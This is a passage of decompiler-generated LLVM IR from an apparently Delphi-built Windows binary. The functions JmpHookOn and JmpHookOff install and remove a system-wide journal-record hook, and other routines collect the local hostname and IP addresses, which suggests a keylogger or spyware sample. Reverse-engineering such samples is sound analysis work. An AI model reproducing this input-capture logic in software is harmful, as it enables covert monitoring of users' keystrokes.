  %22 = icmp eq i1 %21, false, !insn.addr !1802
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1802
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1802
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1802
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1802
  br i1 %22, label %dec_label_pc_407158, label %dec_label_pc_407198, !insn.addr !1802

dec_label_pc_407198:                              ; preds = %dec_label_pc_407158, %dec_label_pc_407134
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1808
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1809
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1810
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1810
  store i32 4223413, i32* %25, align 4, !insn.addr !1810
  %26 = call i32 @"@LStrClr"(), !insn.addr !1811
  ret i32 %26, !insn.addr !1812
}

define i32 @function_4071ae() local_unnamed_addr {
dec_label_pc_4071ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1813
  ret i32 %0, !insn.addr !1813
}

define i32 @function_4071b3() local_unnamed_addr {
dec_label_pc_4071b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1814
}

define i32 @function_4071b5(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4071b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1815
}

define i32 @function_4071c0() local_unnamed_addr {
dec_label_pc_4071c0:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1816
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1816
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1816
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1817
  %2 = call i32 @function_407054(), !insn.addr !1818
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1819
  %4 = call i32 @function_407134(), !insn.addr !1820
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1821
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1822
  %6 = call i32 @"@LStrClr"(), !insn.addr !1823
  ret i32 %6, !insn.addr !1824
}

define i32 @function_407221() local_unnamed_addr {
dec_label_pc_407221:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1825
  ret i32 %0, !insn.addr !1825
}

define i32 @function_407226() local_unnamed_addr {
dec_label_pc_407226:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1826
}

define i32 @function_407228(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407228:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1827
}

define i32 @function_407243() local_unnamed_addr {
dec_label_pc_407243:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1828
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1828
  store i32 %3, i32* %4, align 4, !insn.addr !1828
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1829
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1829
  %9 = add i8 %6, %8, !insn.addr !1829
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1829
  store i8 %9, i8* %10, align 1, !insn.addr !1829
  %11 = add i32 %2, 81, !insn.addr !1830
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1830
  %13 = load i8, i8* %12, align 1, !insn.addr !1830
  %14 = trunc i32 %1 to i8, !insn.addr !1830
  %15 = add i8 %13, %14, !insn.addr !1830
  store i8 %15, i8* %12, align 1, !insn.addr !1830
  %16 = load i32, i32* %eax, align 4, !insn.addr !1831
  ret i32 %16, !insn.addr !1831
}

define x86_fp80 @function_40724b() local_unnamed_addr {
dec_label_pc_40724b:
  %0 = call x86_fp80 @__decompiler_undefined_function_11()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1832
  ret x86_fp80 %1, !insn.addr !1833
}

define i32 @function_407250() local_unnamed_addr {
dec_label_pc_407250:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !1834
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1835
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1835
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1835
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1836
  %3 = call i32 @function_407054(), !insn.addr !1837
  %4 = call i32 @"@LStrCmp"(), !insn.addr !1838
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !1839
  %6 = icmp eq i32 %5, 180, !insn.addr !1840
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !1841
  br i1 %6, label %dec_label_pc_4072b3, label %dec_label_pc_40728e, !insn.addr !1841

dec_label_pc_40728e:                              ; preds = %dec_label_pc_407250
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !1842
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !1843
  %10 = icmp eq i1 %9, false, !insn.addr !1844
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !1844
  br i1 %10, label %dec_label_pc_4072b3, label %dec_label_pc_40729a, !insn.addr !1844

dec_label_pc_40729a:                              ; preds = %dec_label_pc_40728e
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !1845
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_4072b3

dec_label_pc_4072b3:                              ; preds = %dec_label_pc_40729a, %dec_label_pc_407250, %dec_label_pc_40728e
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !1846
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !1847
  %13 = add i32 %esp.1, 8, !insn.addr !1848
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1848
  store i32 4223702, i32* %14, align 4, !insn.addr !1848
  %15 = call i32 @"@LStrClr"(), !insn.addr !1849
  ret i32 %15, !insn.addr !1850
}

define i32 @function_4072cf() local_unnamed_addr {
dec_label_pc_4072cf:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1851
  ret i32 %0, !insn.addr !1851
}

define i32 @function_4072d4() local_unnamed_addr {
dec_label_pc_4072d4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1852
}

define i32 @function_4072d6(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4072d6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1853
}

define i32 @function_4072ec() local_unnamed_addr {
dec_label_pc_4072ec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1854
  %3 = call i32* @GetDC(i32* %2), !insn.addr !1854
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1854
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !1855
  %6 = inttoptr i32 %5 to i32*, !insn.addr !1856
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !1856
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !1857
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !1858
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !1859
  %11 = inttoptr i32 %1 to i32*, !insn.addr !1860
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !1860
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !1861
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1862
  %16 = ashr i32 %15, 31, !insn.addr !1863
  %17 = zext i32 %15 to i64, !insn.addr !1864
  %18 = zext i32 %16 to i64, !insn.addr !1864
  %19 = mul i64 %18, 4294967296, !insn.addr !1864
  %20 = or i64 %19, %17, !insn.addr !1864
  %21 = zext i32 %4 to i64, !insn.addr !1864
  %22 = sdiv i64 %20, %21, !insn.addr !1864
  %23 = trunc i64 %22 to i32, !insn.addr !1864
  ret i32 %23, !insn.addr !1865
}

define i32 @function_407348() local_unnamed_addr {
dec_label_pc_407348:
  %esp.0.reg2mem = alloca i32, !insn.addr !1866
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1867
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1867
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1867
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1868
  %2 = load i32, i32* @global_var_408154, align 4, !insn.addr !1869
  %3 = icmp eq i32 %2, 0, !insn.addr !1869
  br i1 %3, label %dec_label_pc_407384, label %dec_label_pc_407371, !insn.addr !1870

dec_label_pc_407371:                              ; preds = %dec_label_pc_407348
  %4 = inttoptr i32 %2 to i32*, !insn.addr !1871
  store i32 0, i32* %4, align 4, !insn.addr !1871
  br label %dec_label_pc_407384, !insn.addr !1872

dec_label_pc_407384:                              ; preds = %dec_label_pc_407371, %dec_label_pc_407348
  %5 = load i32, i32* @global_var_40813c, align 4, !insn.addr !1873
  %6 = icmp eq i32 %5, 0, !insn.addr !1873
  br i1 %6, label %dec_label_pc_407398, label %dec_label_pc_40738e, !insn.addr !1874

dec_label_pc_40738e:                              ; preds = %dec_label_pc_407384
  %7 = load i32, i32* @global_var_408140, align 4, !insn.addr !1875
  %8 = icmp eq i32 %7, 0, !insn.addr !1875
  %9 = icmp eq i1 %8, false, !insn.addr !1876
  br i1 %9, label %dec_label_pc_4073a2, label %dec_label_pc_407398, !insn.addr !1876

dec_label_pc_407398:                              ; preds = %dec_label_pc_40738e, %dec_label_pc_407384
  %10 = call i32 @function_40747c(), !insn.addr !1877
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1878
  br label %dec_label_pc_40743f, !insn.addr !1878

dec_label_pc_4073a2:                              ; preds = %dec_label_pc_40738e
  %11 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !1879
  %12 = icmp eq i8 %11, 0, !insn.addr !1879
  br i1 %12, label %dec_label_pc_4073cb, label %dec_label_pc_4073ac, !insn.addr !1880

dec_label_pc_4073ac:                              ; preds = %dec_label_pc_4073a2
  %13 = call i32 @function_406c64(), !insn.addr !1881
  %14 = icmp eq i32 %13, 0, !insn.addr !1882
  br i1 %14, label %dec_label_pc_4073cb, label %dec_label_pc_4073c4, !insn.addr !1883

dec_label_pc_4073c4:                              ; preds = %dec_label_pc_4073ac
  %15 = call i32 @function_40747c(), !insn.addr !1884
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1885
  br label %dec_label_pc_40743f, !insn.addr !1885

dec_label_pc_4073cb:                              ; preds = %dec_label_pc_4073ac, %dec_label_pc_4073a2
  %16 = call i32 @"@LStrCatN"(), !insn.addr !1886
  %17 = call i32 @"@LStrAsg"(), !insn.addr !1887
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 2 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1888
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1889
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !1890
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !1890
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1891
  %23 = call i32 @function_40747c(), !insn.addr !1892
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !1892
  br label %dec_label_pc_40743f, !insn.addr !1892

dec_label_pc_40743f:                              ; preds = %dec_label_pc_4073cb, %dec_label_pc_4073c4, %dec_label_pc_407398
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1893
  %25 = load i32, i32* %24, align 4, !insn.addr !1893
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1894
  %26 = add i32 %esp.0.reload, 8, !insn.addr !1895
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1895
  store i32 4224092, i32* %27, align 4, !insn.addr !1895
  %28 = call i32 @"@LStrClr"(), !insn.addr !1896
  ret i32 %28, !insn.addr !1897
}

define i32 @function_407455() local_unnamed_addr {
dec_label_pc_407455:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1898
  ret i32 %0, !insn.addr !1898
}

define i32 @function_40745a() local_unnamed_addr {
dec_label_pc_40745a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1899
}

define i32 @function_40745c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_40745c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1900
}

define i32 @function_40747c() local_unnamed_addr {
dec_label_pc_40747c:
  %0 = call i32 @"@LStrClr"(), !insn.addr !1901
  %1 = call i32 @"@LStrClr"(), !insn.addr !1902
  ret i32 %1, !insn.addr !1903
}

define i32 @function_407494() local_unnamed_addr {
dec_label_pc_407494:
  %eax.0.reg2mem = alloca i32, !insn.addr !1904
  %esp.0.reg2mem = alloca i32, !insn.addr !1904
  %esp.15.reg2mem = alloca i32, !insn.addr !1904
  %storemerge6.reg2mem = alloca i32, !insn.addr !1904
  %.reg2mem = alloca i32, !insn.addr !1904
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !1904
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !1905
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !1906
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !1907
  %5 = call i32 @"@LStrClr"(), !insn.addr !1908
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1909
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !1909
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !1910
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !1911
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !1912
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !1912
  %11 = icmp eq %hostent* %9, null, !insn.addr !1913
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1914
  br i1 %11, label %dec_label_pc_4074f2, label %dec_label_pc_4074cc, !insn.addr !1914

dec_label_pc_4074cc:                              ; preds = %dec_label_pc_407494
  %12 = add i32 %10, 12, !insn.addr !1915
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1915
  %14 = load i32, i32* %13, align 4, !insn.addr !1915
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1916
  %16 = load i32, i32* %15, align 4, !insn.addr !1916
  %17 = icmp eq i32 %16, 0, !insn.addr !1917
  %18 = icmp eq i1 %17, false, !insn.addr !1918
  br i1 %18, label %dec_label_pc_4074d3.lr.ph, label %dec_label_pc_4074ed, !insn.addr !1918

dec_label_pc_4074d3.lr.ph:                        ; preds = %dec_label_pc_4074cc
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !1911
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_4074d3

dec_label_pc_4074d3:                              ; preds = %dec_label_pc_4074d3.lr.ph, %dec_label_pc_4074e5
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !1919
  %21 = icmp eq i1 %20, false, !insn.addr !1920
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !1920
  br i1 %21, label %dec_label_pc_4074e5, label %dec_label_pc_4074d7, !insn.addr !1920

dec_label_pc_4074d7:                              ; preds = %dec_label_pc_4074d3
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !1921
  %23 = load i32, i32* %22, align 4, !insn.addr !1921
  %24 = add i32 %esp.15.reload, -4, !insn.addr !1921
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1921
  store i32 %23, i32* %25, align 4, !insn.addr !1921
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !1922
  %27 = call i32 @StrPas(), !insn.addr !1923
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !1923
  br label %dec_label_pc_4074e5, !insn.addr !1923

dec_label_pc_4074e5:                              ; preds = %dec_label_pc_4074d7, %dec_label_pc_4074d3
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !1924
  %29 = mul i32 %28, 4, !insn.addr !1916
  %30 = add i32 %29, %14, !insn.addr !1916
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1916
  %32 = load i32, i32* %31, align 4, !insn.addr !1916
  %33 = icmp eq i32 %32, 0, !insn.addr !1917
  %34 = icmp eq i1 %33, false, !insn.addr !1918
  store i32 %32, i32* %.reg2mem, !insn.addr !1918
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !1918
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !1918
  br i1 %34, label %dec_label_pc_4074d3, label %dec_label_pc_4074ed, !insn.addr !1918

dec_label_pc_4074ed:                              ; preds = %dec_label_pc_4074e5, %dec_label_pc_4074cc
  %35 = call i32 @WSACleanup(), !insn.addr !1925
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !1925
  br label %dec_label_pc_4074f2, !insn.addr !1925

dec_label_pc_4074f2:                              ; preds = %dec_label_pc_4074ed, %dec_label_pc_407494
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1926
}

define i32 @function_407500() local_unnamed_addr {
dec_label_pc_407500:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1927
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1927
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1927
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1928
  %2 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1929
  %3 = add i32 %2, 1, !insn.addr !1929
  store i32 %3, i32* @global_var_4096e0, align 4, !insn.addr !1929
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1930
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1931
  ret i32 0, !insn.addr !1932
}

define i32 @function_407525() local_unnamed_addr {
dec_label_pc_407525:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1933
  ret i32 %0, !insn.addr !1933
}

define i32 @function_40752a() local_unnamed_addr {
dec_label_pc_40752a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1934
}

define i32 @function_40752c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40752c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1935
}

define i32 @function_407530() local_unnamed_addr {
dec_label_pc_407530:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1936
  %2 = add i32 %1, -1, !insn.addr !1936
  store i32 %2, i32* @global_var_4096e0, align 4, !insn.addr !1936
  ret i32 %0, !insn.addr !1937
}

define i32 @function_407538(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407538:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1938
  %2 = call i32 @CallNextHookEx(i32* %1, i32 %arg1, i32 %arg2, i32 %arg3), !insn.addr !1938
  ret i32 %2, !insn.addr !1939
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_407558:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4224312 to i32*), i32 3), !insn.addr !1940
  %2 = ptrtoint i32* %1 to i32, !insn.addr !1940
  store i32 %2, i32* @global_var_4096e8, align 4, !insn.addr !1941
  %3 = icmp eq i32* %1, null, !insn.addr !1942
  %4 = icmp eq i1 %3, false, !insn.addr !1943
  %5 = sext i1 %4 to i32, !insn.addr !1944
  ret i32 %5, !insn.addr !1945
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_407584:
  %0 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1946
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1947
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !1947
  %3 = sext i1 %2 to i32, !insn.addr !1947
  ret i32 %3, !insn.addr !1948
}

define i32 @function_407590() local_unnamed_addr {
dec_label_pc_407590:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1949
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1949
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1949
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1950
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1951
  %3 = add i32 %2, 1, !insn.addr !1951
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1951
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1952
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1953
  ret i32 0, !insn.addr !1954
}

define i32 @function_4075b5() local_unnamed_addr {
dec_label_pc_4075b5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1955
  ret i32 %0, !insn.addr !1955
}

define i32 @function_4075ba() local_unnamed_addr {
dec_label_pc_4075ba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1956
}

define i32 @function_4075bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4075bc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1957
}

define i32 @function_4075c0() local_unnamed_addr {
dec_label_pc_4075c0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1958
  %2 = add i32 %1, -1, !insn.addr !1958
  store i32 %2, i32* @global_var_4096e4, align 4, !insn.addr !1958
  ret i32 %0, !insn.addr !1959
}

define i32* @function_4075c8(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_4075c8:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !1960
  ret i32* %0, !insn.addr !1960
}

define i32 @function_4075d0() local_unnamed_addr {
dec_label_pc_4075d0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1961
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1961
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1961
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1962
  %2 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1963
  %3 = add i32 %2, 1, !insn.addr !1963
  store i32 %3, i32* @global_var_4096ec, align 4, !insn.addr !1963
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1964
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1965
  ret i32 0, !insn.addr !1966
}

define i32 @function_4075f5() local_unnamed_addr {
dec_label_pc_4075f5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1967
  ret i32 %0, !insn.addr !1967
}

define i32 @function_4075fa() local_unnamed_addr {
dec_label_pc_4075fa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1968
}

define i32 @function_4075fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4075fc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1969
}

define i32 @function_407600() local_unnamed_addr {
dec_label_pc_407600:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1970
  %2 = add i32 %1, -1, !insn.addr !1970
  store i32 %2, i32* @global_var_4096ec, align 4, !insn.addr !1970
  ret i32 %0, !insn.addr !1971
}

define i32 @function_407660(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407660:
  %esp.1.reg2mem = alloca i32, !insn.addr !1972
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1972
  %eax.0.reg2mem = alloca i32, !insn.addr !1972
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !1973
  %7 = icmp eq i8 %6, 0, !insn.addr !1973
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !1974
  br i1 %7, label %dec_label_pc_407673, label %dec_label_pc_40766b, !insn.addr !1974

dec_label_pc_40766b:                              ; preds = %dec_label_pc_407660
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !1975
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !1975
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !1975
  br label %dec_label_pc_407673, !insn.addr !1975

dec_label_pc_407673:                              ; preds = %dec_label_pc_40766b, %dec_label_pc_407660
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !1976
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1977
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !1977
  %13 = ptrtoint i32* %12 to i32, !insn.addr !1977
  %14 = add i32 %eax.0.reload, 8, !insn.addr !1978
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1978
  store i32 %13, i32* %15, align 4, !insn.addr !1978
  %16 = icmp eq i32* %12, null, !insn.addr !1979
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1980
  br i1 %16, label %dec_label_pc_4076cb, label %dec_label_pc_40768f, !insn.addr !1980

dec_label_pc_40768f:                              ; preds = %dec_label_pc_407673
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !1981
  %18 = add i32 %eax.0.reload, 12, !insn.addr !1982
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1982
  store i32 %17, i32* %19, align 4, !insn.addr !1982
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !1983
  %21 = add i32 %eax.0.reload, 16, !insn.addr !1984
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1984
  store i32 %20, i32* %22, align 4, !insn.addr !1984
  %23 = add i32 %eax.0.reload, 20, !insn.addr !1985
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1985
  store i32 %arg3, i32* %24, align 4, !insn.addr !1985
  %25 = load i32, i32* %22, align 4, !insn.addr !1986
  %26 = add i32 %esp.0, -8, !insn.addr !1987
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1987
  store i32 %25, i32* %27, align 4, !insn.addr !1987
  %28 = add i32 %esp.0, -12, !insn.addr !1988
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1988
  store i32 %17, i32* %29, align 4, !insn.addr !1988
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !1989
